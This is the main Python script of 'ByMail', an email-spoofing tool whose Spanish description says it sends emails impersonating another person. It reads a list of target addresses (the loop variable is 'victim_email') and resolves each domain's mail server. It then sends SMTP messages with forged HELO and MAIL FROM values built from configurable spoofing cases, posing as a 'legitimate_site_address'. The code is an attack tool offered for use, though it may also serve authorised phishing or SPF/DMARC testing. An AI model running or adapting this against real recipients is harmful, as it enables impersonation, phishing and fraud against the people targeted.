import sys
import argparse

from taser import printx

import config
import cases
from additional.common import *
from additional.sendmail import *
from tabulate import tabulate
from builder import Builder


cases = cases.cases
config = config.config


def banner():
    printx.colored('''
    
======================================================================================                                                                                                                                                     
                        ______        ___  ___        _  _ 
                        | ___ \       |  \/  |       (_)| |
                        | |_/ / _   _ | .  . |  __ _  _ | |
                        | ___ \| | | || |\/| | / _` || || |
                        | |_/ /| |_| || |  | || (_| || || |
                        \____/  \__, |\_|  |_/ \__,_||_||_|
                                __/  |                     
                                |___/
======================================================================================                          
    ''', fg='blue')
    printx.colored("                               Version: v0.1.0", fg="purple")
    printx.colored("                               Author: @marcsabate7",fg= "purple")


def parse_args():
    print("\n")
    parser = argparse.ArgumentParser(
        description="DESCRIPTION: Este script se utiliza para enviar correos electronicos suplantando la identidad de otra persona",usage="\n- python bymail.py   \n\n  ES NECESSARIO RELLENAR los siguientes ficheros para USAR la herramienta:\n\t- usuarios.txt \n\t -body.txt\n\t- config.py \n ", epilog='\nEjemplo: \r\npython ' + sys.argv[0] + " -v True"
    )

    parser.add_argument('-v', required=False, default=False, type=bool,help='Mostrar mensajes por pantalla (True/False)')

    args = parser.parse_args()
    return args

def end_script():
    print("\n")
    printx.colored("[-] Closing...",fg="red")
    sys.exit(1)

def check_config(args):

    col_names = ["Option", "Value"]
    data = []
    mode = config['case_id']

    print("Congifuration: \n")
    if mode.decode("utf-8") not in cases:
        printx.colored("[-] You need to set a valid mode, please select one from 'cases.py'",fg="red")
        end_script()
    data.append(["Mode ID", mode.decode("utf-8")])

    emails = read_user_emails()
    if len(emails) == 0:
        printx.colored("[-] Users file is empty",fg="red")
        end_script()
    data.append(["Total of users uploaded", len(emails)])

    tls_chiper = config["server_mode"]["starttls"]
    data.append(["TLS chiper", tls_chiper])

    data.append(["Sending emails as", str(config["legitimate_site_address"].decode("utf-8"))])
    data.append(["Verbose mode", str(args.v)])

    print(tabulate(data, headers=col_names, tablefmt="fancy_grid"))

    # LListar domini com el que esta enviant
    # Llistar xifratge
    # Listar correu com el que esta enviant


def main():
    banner()
    
    args = parse_args()
    check_config(args)

    print("\n")
    printx.colored("[+] Starting sending emails...",fg="green")

    emails = read_user_emails()

    for victim_email in emails:
        domain = victim_email.split("@")[1]
        mail_server_ip = get_mail_server_from_email_address(domain)

        mail_server_port = config["server_mode"]['recv_mail_server_port']
        starttls = config['server_mode']['starttls']

        builder_obj = Builder(cases,config,victim_email)
        smtp_seqs = builder_obj.generate_smtp_seqs()

        message_content = smtp_seqs["msg_content"]

        send_mail = SendMail()
        send_mail.set_mail_info((mail_server_ip, mail_server_port),helo=smtp_seqs["helo"], mail_from=smtp_seqs["mailfrom"], rcpt_to =smtp_seqs["rcptto"], email_data=message_content, starttls=starttls,verbose = args.v)
        send_mail.send_mail()

if __name__ == '__main__':
    main()